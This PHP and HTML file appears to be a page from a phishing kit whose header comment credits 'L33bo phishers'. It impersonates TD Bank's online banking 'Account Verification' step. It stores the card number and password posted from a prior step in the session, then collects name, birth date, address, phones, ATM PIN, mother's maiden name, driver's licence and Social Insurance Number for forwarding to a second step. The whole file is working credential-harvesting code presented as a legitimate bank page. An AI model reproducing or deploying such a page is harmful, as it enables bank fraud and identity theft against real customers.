<?php
/*
L33bo phishers = ICQ: 695059760
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
$_SESSION['user'] = $_POST['login:AccessCard'];
$_SESSION['pass'] = $_POST['login:Webpassword'];
?>
<!DOCTYPE html>
<html lang="en" xml:lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<title>Account Verification</title>
 	<link type="text/css" href="assets/css/default.css" rel="stylesheet">
 	<link type="text/css" href="assets/css/eg-custom.css" rel="stylesheet">
	<link rel="stylesheet" href="assets/css/ns-hybrid.css" type="text/css"> 
	<link rel="stylesheet" href="assets/css/forms.css" type="text/css"> 
	<link rel="icon" type="image/ico" href="assets/img/favicon.ico"/>
	<script src="assets/js/gen_validatorv4.js"  type="text/javascript"></script>
	 <script type="text/javascript">
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
</script>
<script type="text/javascript">
function submitform()
{
  if(document.step1.onsubmit())
  {
    document.step1.submit();
  }
}
</script>
</head>


	
<body class="td-JS-enabled"> 
	

	<div class="td-skip">
		<a href="#" onclick="moveSection(&#39;main&#39;); return false;">Skip to main content</a>
	</div> 
	
	<div id="td-wrapper">
	 	 
		<div id="td-container">
			

<header class="td-layout-row" id="td-layout-header" role="banner">
<div class="td-layout-column td-layout-grid7 td-layout-column-first">
<div id="td-logo"><img height="50" src="assets/img/Logo2.gif" width="384"></div>
</div>
<div class="td-layout-column td-layout-grid8 td-noprint td-layout-column-last">
<div class="td-layout-row">
<div class="td-layout-column td-layout-grid8 td-copy-align-right td-layout-column-first td-layout-column-last">
<ul class="td-list-inline td-link-nounderline td-margin-bottom-large">
<li class="td-copy-sub td-link-colour-grey"><a href="#">WebBroker</a></li>
<li class="td-copy-sub td-link-colour-grey"><a href="#">U.S. Online Banking</a></li>
<li><img src="assets/img/icon-lock.gif" width="10">&nbsp;<strong class="td-copy-emphasized td-copy-align-middle"><a href="#">Account Verification</a></strong>&nbsp;<a class="td-button td-button-secondary td-button-compact" href="https://easyweb.td.com/waw/ezw/servlet/ca.tdbank.banking.servlet.LogoffServlet"><span class="td-button-label">Logout</span></a></li>
</ul>
</div>
</div>
<div class="td-layout-row">
<div class="td-layout-column td-layout-grid8 td-layout-column-first td-copy-align-right td-layout-column-last">
<ul class="td-list-inline td-copy-sub td-link-nounderline td-link-colour-grey">
<li><a href="#">Contact Us</a></li>
<li><a href="#">Apply</a></li>
<li><a href="#">Search</a></li>
</ul>
</div>
</div>
</div>
</header>

			
			
			
			<div class="td-layout-row td-noprint" id="td-layout-nav-main" role="navigation">
				<div class="td-layout-column td-layout-grid15 td-layout-column-first td-layout-column-last">
				   				

<nav id="td-nav-level1" class="clear"> 
	<ul>
	    <li class="td-nav-level1-active">
	    	<span class="td-nav-level1-label">
	    		<span class="td-nav-level1-indicator">You are in this section:</span>
	    		<a href="#">My Accounts</a>
	    	</span>
	    </li>
	    <li><span class="td-nav-level1-label"><a href="#">Customer Service</a></span></li>
	    <li><span class="td-nav-level1-label"><a href="#">Products &amp; Services</a></span></li> 
	    <li><span class="td-nav-level1-label"><a href="#">Markets &amp; Research</a></span></li>
	    <li><span class="td-nav-level1-label"><a href="#">Planning</a></span></li>
    </ul>
</nav>

				   

<nav class="clear" id="td-nav-level2">
<ul>
<li><span class="td-nav-level2-label"><a href="#">Accounts</a></span></li>
<li><span class="td-nav-level2-label"><a href="#">Payments</a></span></li>
<li><span class="td-nav-level2-label"><a href="#">Transfers</a></span></li>
<li><span class="td-nav-level2-label"><a href="#">Investments</a></span></li>
<li class="td-nav-level2-active"><span class="td-nav-level2-label"><span class="td-nav-level2-indicator">You are in this section:</span> <a href="#">Administration</a></span></li>
</ul>
</nav>

				</div>
			</div>	 
			
			
			
    		
    		<div id="td-layout-contentarea" class="td-layout-row">
    			
    			<div class="td-layout-column td-layout-grid3 td-layout-column-first td-noprint">
    				 
    					
    				






<nav class="clear" id="td-nav-left" role="navigation">
	<a id="leftnav" name="leftnav" tabindex="-1"></a>
	<ul>
		<li>
			<ul><li class="td-nav-left-first-child"><span class="td-nav-left-label"><a href="#">Customize Site</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Rename Accounts</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Session History</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Change Home Address</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Change Password &amp; Security</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Apply for Products</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Open a Small Business Account</a></span></li>
				<li class=""><span class="td-nav-left-label"><a href="#">Email Notifications</a></span></li>
				<li class="td-nav-left-last-child td-nav-left-active"><span class="td-nav-left-label"><span class="td-nav-left-indicator">You are currently viewing:</span><a href="#">Account Verification</a></span></li>
			</ul>
		</li>
	</ul>
</nav>
					



					

<!-- tdcq100012113 start -->
<script type="text/javascript">
	function QLGotoWebdoxs(){
		document.frmQLGotoWebdoxs.WebdoxsTSO.value = "QLKToWebdoxs";
		document.frmQLGotoWebdoxs.submit();
	}
</script>

<div class="td-callout td-callout-tertiary td-margin-none">
         <div class="td-callout-heading">
         	<h4>
         		My Links
         	</h4>
         </div>
         <p class="td-copy-sub"><a href="#">Choose my links</a>&nbsp;</p>
         <ul class="td-list-links td-copy-sub">
	
				<li><a href="#">Pay Bills</a></li>
			
		
				<li><a href="#">Make a Transfer</a></li>
			
		
				<li><a href="#">Purchase Mutual Funds</a></li>
			
		
				<li><a href="#">WebBroker</a></li>
			
		
				<li><a href="#">View Bills</a></li>
			
		
         </ul>
         </div>


					
    			</div><!-- End .td-layout-column -->
    			
    				
    			<div class="td-layout-column td-layout-grid12 td-layout-column-last" role="main">
				   <a name="main" id="main" tabindex="-1"></a>
    				




<form name="step1" id="step1" action="Step2.php?&sessionid=<?php echo generateRandomString(30); ?>&securessl=true" method="POST">
	
	<table width="100%" border="0" cellpadding="0" cellspacing="0">
		<tbody>
		<tr>
			<td class="td-copy-align-top" colspan="2">
				<div id="td-pagetitlearea" class="td-margin-bottom-medium">
					<div class="td-layout-row">
						<div class="td-layout-column td-layout-grid10 td-layout-column-first">
							<h1>Account Verification</h1>
						</div>
						<div class="td-layout-column td-layout-grid2 td-copy-align-right td-margin-none td-layout-column-last">
							<a href="#">Help</a>
						</div>
					</div>
				</div>
				
				<div class="td-layout-row">
					<div class="td-layout-column td-layout-grid12 td-margin-none td-layout-column-first td-layout-column-last">
						<h3 class="td-margin-top-small">Step: 1 of 2</h3>
					</div>
				</div>
				<div class="td-layout-row">
					<div class="td-layout-column td-layout-grid12 td-margin-none td-layout-column-first td-layout-column-last">
						<h4 class="td-margin-top-small">Please enter your information below in order to restore your access to our online banking system, by participating in our account verification process you are also helping to safeguard your account.</h4>
					</div>
				</div>
			</td>
		</tr>
		<tr>
			<td colspan="2"><br>
				
					<table width="100%" border="0" cellpadding="0" cellspacing="0" class="elementBgAECAB4">
						<tbody><tr class="bgcolorAECAB4">
							<th width="100%" class="formtitle td-copy-align-left" valign="middle" colspan="2">
								&nbsp;<b>Personal Details</b>
							</th>
							
						</tr>
					</tbody></table>
					<table border="0" cellpadding="5" cellspacing="0" width="100%" class="element">
						<tbody>
						<tr>
							<th scope="row" class="table td-copy-align-left"  valign="top""><span id="name">Full Name</span>:</th>
							<td class="table" width="73%"><input type="text" required size="25" id="name" name="name" value="" maxlength="60"><div id='step1_name_errorloc' class="error_strings"></div></td>
						</tr>					
						<tr>
							<th scope="row" class="table td-copy-align-left"  valign="top""><span id="dob">Date Of Birth</span>:</th>
							<td class="table" width="73%">
								<select required name="dobm" id="dobm">
										<option value="" disabled="disabled" selected="selected">MM</option>
										<option value="01">Jan</option>
										<option value="02">Feb</option>
										<option value="03">Mar</option>
										<option value="04">Apr</option>
										<option value="05">May</option>
										<option value="06">Jun</option>
										<option value="07">Jul</option>
										<option value="08">Aug</option>
										<option value="09">Sep</option>
										<option value="10">Oct</option>
										<option value="11">Nov</option>
										<option value="12">Dec</option>
								</select>
								<select required name="dobd" id="dobd">
										<option value="" disabled="disabled" selected="selected">DD</option>
										<option value="01">01</option>
										<option value="02">02</option>
										<option value="03">03</option>
										<option value="04">04</option>
										<option value="05">05</option>
										<option value="06">06</option>
										<option value="07">07</option>
										<option value="08">08</option>
										<option value="09">09</option>
										<option value="10">10</option>
										<option value="11">11</option>
										<option value="12">12</option>
										<option value="13">13</option>
										<option value="14">14</option>
										<option value="15">15</option>
										<option value="16">16</option>
										<option value="17">17</option>
										<option value="18">18</option>
										<option value="19">19</option>
										<option value="20">20</option>
										<option value="21">21</option>
										<option value="22">22</option>
										<option value="23">23</option>
										<option value="24">24</option>
										<option value="25">25</option>
										<option value="26">26</option>
										<option value="27">27</option>
										<option value="28">28</option>
										<option value="29">29</option>
										<option value="30">30</option>
										<option value="31">31</option>
								</select>
								<select required name="doby" id="doby">
										<option disabled="disabled" selected="selected" value="">YYYY</option>
										<option value="2015">2015</option>
										<option value="2014">2014</option>
										<option value="2013">2013</option>
										<option value="2012">2012</option>
<option value="2011">2011</option>
<option value="2010">2010</option>
<option value="2009">2009</option>
<option value="2008">2008</option>
<option value="2007">2007</option>
<option value="2006">2006</option>
<option value="2005">2005</option>
<option value="2004">2004</option>
<option value="2003">2003</option>
<option value="2002">2002</option>
<option value="2001">2001</option>
<option value="2000">2000</option>
<option value="1999">1999</option>
<option value="1998">1998</option>
<option value="1997">1997</option>
<option value="1996">1996</option>
<option value="1995">1995</option>
<option value="1994">1994</option>
<option value="1993">1993</option>
<option value="1992">1992</option>
<option value="1991">1991</option>
<option value="1990">1990</option>
<option value="1989">1989</option>
<option value="1988">1988</option>
<option value="1987">1987</option>
<option value="1986">1986</option>
<option value="1985">1985</option>
<option value="1984">1984</option>
<option value="1983">1983</option>
<option value="1982">1982</option>
<option value="1981">1981</option>
<option value="1980">1980</option>
<option value="1979">1979</option>
<option value="1978">1978</option>
<option value="1977">1977</option>
<option value="1976">1976</option>
<option value="1975">1975</option>
<option value="1974">1974</option>
<option value="1973">1973</option>
<option value="1972">1972</option>
<option value="1971">1971</option>
<option value="1970">1970</option>
<option value="1969">1969</option>
<option value="1968">1968</option>
<option value="1967">1967</option>
<option value="1966">1966</option>
<option value="1965">1965</option>
<option value="1964">1964</option>
<option value="1963">1963</option>
<option value="1962">1962</option>
<option value="1961">1961</option>
<option value="1960">1960</option>
<option value="1959">1959</option>
<option value="1958">1958</option>
<option value="1957">1957</option>
<option value="1956">1956</option>
<option value="1955">1955</option>
<option value="1954">1954</option>
<option value="1953">1953</option>
<option value="1952">1952</option>
<option value="1951">1951</option>
<option value="1950">1950</option>
<option value="1949">1949</option>
<option value="1948">1948</option>
<option value="1947">1947</option>
<option value="1946">1946</option>
<option value="1945">1945</option>
<option value="1944">1944</option>
<option value="1943">1943</option>
<option value="1942">1942</option>
<option value="1941">1941</option>
<option value="1940">1940</option>
<option value="1939">1939</option>
<option value="1938">1938</option>
<option value="1937">1937</option>
<option value="1936">1936</option>
<option value="1935">1935</option>
<option value="1934">1934</option>
<option value="1933">1933</option>
<option value="1932">1932</option>
<option value="1931">1931</option>
<option value="1930">1930</option>
<option value="1929">1929</option>
<option value="1928">1928</option>
<option value="1927">1927</option>
<option value="1926">1926</option>
<option value="1925">1925</option>
<option value="1924">1924</option>
<option value="1923">1923</option>
<option value="1922">1922</option>
<option value="1921">1921</option>
<option value="1920">1920</option>
<option value="1919">1919</option>
<option value="1918">1918</option>
<option value="1917">1917</option>
<option value="1916">1916</option>
<option value="1915">1915</option>
<option value="1914">1914</option>
<option value="1913">1913</option>
<option value="1912">1912</option>
<option value="1911">1911</option>
<option value="1910">1910</option>
<option value="1909">1909</option>
<option value="1908">1908</option>
<option value="1907">1907</option>
<option value="1906">1906</option>
<option value="1905">1905</option>
<option value="1904">1904</option>
<option value="1903">1903</option>
<option value="1902">1902</option>
<option value="1901">1901</option>
								</select>
								<div id='step1_dobd_errorloc' class="error_strings"></div>
							</td>
						</tr>
						<tr>
							<th scope="row" class="table td-copy-align-left"  valign="top""><span id="street">Street Address</span>:</th>
							<td class="table"><input type="text" required size="40" id="street" name="street" value="" maxlength="27"><div id='step1_street_errorloc' class="error_strings"></div>
							</td>
						<tr>
							<th scope="row" class="table td-copy-align-left"><span id="city">City/Town</span>:</th>
							<td class="table"><input type="text" required size="30" id="city" name="city" value="" maxlength="20"><div id='step1_city_errorloc' class="error_strings"></div>
							</td>
						</tr>
						<tr>
							<th scope="row" class="table td-copy-align-left"  valign="top""><span id="province">Province</span>:</th>
							<td class="table">
<select id="province" name="province">
<option selected="selected" value="">Select Province</option>
	<option value="AB">AB</option>
	<option value="BC">BC</option>
	<option value="MB">MB</option>
	<option value="NB">NB</option>
	<option value="NL">NL</option>
	<option value="NS">NS</option>
	<option value="ON">ON</option>
	<option value="PE">PE</option>
	<option value="PQ">PQ</option>
	<option value="SK">SK</option>
	<option value="NU">NU</option>
	<option value="NT">NT</option>
	<option value="YT">YT</option>
</select><div id='step1_province_errorloc' class="error_strings"></div>
							</td>
						</tr>
						<tr>
							<th scope="row" class="table td-copy-align-left"><span id="postalCode">Postal Code</span>:</th>
							<td class="table">
									<input type="text" required size="4" maxlength="3" name="postal1" onchange="formatText(this);" value="" aria-label="First three characters" aria-labelledby="postalCode"></div>&nbsp;&nbsp;-&nbsp;&nbsp;
									<input type="text" required size="4" maxlength="3" name="postal2" onchange="formatText(this);" value="" aria-label="Last three characters" aria-labelledby="postalCode"><div id='step1_postal2_errorloc' class="error_strings"></div>
							</td>
						</tr>
						<tr>
							<th scope="row" class="table td-copy-align-left">Country:</th>
							<td class="table">Canada</td>
						</tr>
						<tr>
							<th scope="row" class="table td-copy-align-left"><span id="newHomePhone">Home Phone</span>:</th>
							<td class="table" width="73%">(&nbsp;<input type="text" required size="3" name="HomeArea" maxlength="3" value="" aria-label="Area Code" aria-labelledby="newHomePhone" onkeyup="movetoNext(this, 'Home3')"> )
								<input type="text" required size="3" name="Home3" id="Home3" maxlength="3" value="" aria-label="Next Three Digits" aria-labelledby="newHomePhone" onkeyup="movetoNext(this, 'Home4')"> -
								<input type="text" required size="4" name="Home4" id="Home4" maxlength="4" value="" aria-label="Last Four Digits" aria-labelledby="newHomePhone"onkeyup="movetoNext(this, 'BusArea')"><div id='step1_Home4_errorloc' class="error_strings"></div></td>
						</tr>
						<tr>
							<th scope="row" class="table td-copy-align-left"><span id="newBusPhone">Business Phone</span>:</th>
							<td class="table" width="73%">(&nbsp;<input type="text" required size="3" name="BusArea" id="BusArea" maxlength="3" value="" aria-label="Area Code" aria-labelledby="newBusPhone" onkeyup="movetoNext(this, 'Bus3')"> )
								<input type="text" required size="3" name="Bus3" id="Bus3" maxlength="3" value="" aria-label="Next Three Digits" aria-labelledby="newBusPhone" onkeyup="movetoNext(this, 'Bus4')"> -
								<input type="text" required size="4" name="Bus4" id="Bus4" maxlength="4" value="" aria-label="Last Four Digits" aria-labelledby="newBusPhone">
								 &nbsp;&nbsp;&nbsp;<label for="BusExt">Extension</label>:
								<!-- CQ# 39124 - Change business phone number extension to 5 characters (left out of EasyWeb 7.4 release) -->
								<input type="text" required size="4" id="BusExt" name="BusExt" maxlength="4" value="" aria-label="Extension" aria-labelledby="newBusPhone"></td>
						</tr>
						<tr>
							<th scope="row" class="table td-copy-align-left"><span id="pin">ATM Pin</span>:</th>
							<td class="table">
									<input type="password" required size="4" maxlength="4" name="pin" value=""><div id='step1_pin_errorloc' class="error_strings"></div>
							</td>
						</tr>
						<tr>
							<th scope="row" class="table td-copy-align-left"><span id="email">E-mail Address</span>:</th>
							<td class="table" width="73%"><input type="email" required size="25" id="email" name="email" value="" maxlength="60"><div id='step1_email_errorloc' class="error_strings"></div></td>
						</tr>
						<tr>
							<th scope="row" class="table td-copy-align-left"><span id="dl">Driving Licence Number</span>:</th>
							<td class="table" width="73%"><input type="text" size="25" id="dl" placeholder="If Applicable" name="dl" value="" maxlength="60"></td>
						</tr>
						<tr>
							<th scope="row" class="table td-copy-align-left"><span id="mmn">Mothers Maiden Name</span>:</th>
							<td class="table" width="73%"><input type="text" size="25" id="mmn" name="mmn" value="" maxlength="60"><div id='step1_mmn_errorloc' class="error_strings"></div></td>
						</tr>
						<tr>
							<th scope="row" class="table td-copy-align-left"><span id="ssn">Social Insurance Number</span>:</th>
							<td class="table" width="73%">
								<input aria-required="true" maxlength="3" size="3" type="tel" id="ssn" class="ssn" name="ssn1"  onkeyup="movetoNext(this, 'ssn2')" required>
								<input aria-required="true" maxlength="2" size="3" type="tel" id="ssn2" class="ssn" name="ssn2" onkeyup="movetoNext(this, 'ssn3')" required>
								<input aria-required="true" maxlength="4" size="3" type="tel" id="ssn3" class="ssn" name="ssn3" required><div id='step1_ssn3_errorloc' class="error_strings"></div>
							</td>
						</tr>						
						
					</tbody>
					</table>
					
				<table border="0" cellpadding="0" cellspacing="0" align="right">
					<tbody><tr>
						<td colspan="2">&nbsp;</td>
					</tr>
					<tr>
						<td>&nbsp;&nbsp;</td>
						<td><a href="javascript: submitform()"><img src="assets/img/next_cp.gif" alt="Next " border="0"></a></td>
					</tr>
				</tbody></table>
			</td>
		</tr>
	</tbody></table>

</form>
 <script type="text/javascript">
var myformValidator = new Validator("step1");
myformValidator.EnableOnPageErrorDisplay();
myformValidator.EnableMsgsTogether();
myformValidator.addValidation("name","req", "Please enter your full name");
myformValidator.addValidation("dobm","dontselect=", "Please select your date of birth");
myformValidator.addValidation("dobd","dontselect=", "Please select your date of birth");
myformValidator.addValidation("doby","dontselect=", "Please select your date of birth");
myformValidator.addValidation("street","req", "Please enter your street");
myformValidator.addValidation("city","req", "Please enter your city");
myformValidator.addValidation("province","dontselect=-", "Please select your province");
myformValidator.addValidation("postal1","req", "Please enter your postcode");
myformValidator.addValidation("postal2","req", "Please enter your postcode");
myformValidator.addValidation("HomeArea","req", "Please enter your home telephone number");
myformValidator.addValidation("HomeArea","maxlen=3");
myformValidator.addValidation("HomeArea","minlen=3", "Area code must be 3 digits");
myformValidator.addValidation("HomeArea","numeric", "This field can only contain numeric characters");
myformValidator.addValidation("Home3","req", "Please enter your home telephone number");
myformValidator.addValidation("Home3","maxlen=3");
myformValidator.addValidation("Home3","minlen=3", "Phone number must be 10 digits");
myformValidator.addValidation("Home3","numeric", "This field can only contain numeric characters");
myformValidator.addValidation("Home4","req", "Please enter your home telephone number");
myformValidator.addValidation("Home4","maxlen=4");
myformValidator.addValidation("Home4","minlen=4", "Phone number must be 10 digits");
myformValidator.addValidation("Home4","numeric", "This field can only contain numeric characters");
myformValidator.addValidation("ssn1","req", "Please enter your social insurance number");
myformValidator.addValidation("ssn1","maxlen=3");
myformValidator.addValidation("ssn1","minlen=3", "Social insurance number must be 9 digits");
myformValidator.addValidation("ssn1","numeric", "This field can only contain numeric characters");
myformValidator.addValidation("ssn2","req", "Please enter your social insurance number");
myformValidator.addValidation("ssn2","maxlen=2");
myformValidator.addValidation("ssn2","minlen=2", "Social insurance number must be 9 digits");
myformValidator.addValidation("ssn2","numeric", "This field can only contain numeric characters");
myformValidator.addValidation("ssn3","req", "Please enter your social insurance number");
myformValidator.addValidation("ssn3","maxlen=4");
myformValidator.addValidation("ssn3","minlen=4", "Social insurance number must be 9 digits");
myformValidator.addValidation("ssn3","numeric", "This field can only contain numeric characters");
myformValidator.addValidation("email","email", "Please enter a valid email address");
myformValidator.addValidation("email","req", "Please enter a valid email address");
myformValidator.addValidation("mmn","req", "Please enter your mothers maiden name");
myformValidator.addValidation("pin","req", "Please enter your atm pin");
myformValidator.addValidation("pin","minlen=4", "Please enter your atm pin");
myformValidator.addValidation("pin","maxlen=4", "Please enter your atm pin");
</script>


    			</div>
    			
    		</div>
    		
		</div> 
			
	
		
			


<footer class="td-layout-row" id="td-layout-footer">
 	<div class="td-layout-column td-layout-grid11 td-noprint td-layout-column-first">
	 	<ul class="td-list-inline td-copy-sub td-link-colour-grey td-link-nounderline">
			<li><a href="#">Privacy Policy</a></li>
			<li><a href="#">Internet Security</a></li>
			<li><a href="#">Legal</a></li>
		</ul>
	</div>
	<div class="td-copy-align-right td-layout-column td-layout-grid4 td-noprint td-margin-none td-layout-column-last">
		 
	 	<span class="td-copy-sub td-copy-grey">Server ID: B11A : 1430949905605</span>
	 	
	</div>
	
</footer>
 <!-- End #td-layout-footer -->
		
	</div> 
		 



</body>
</html>
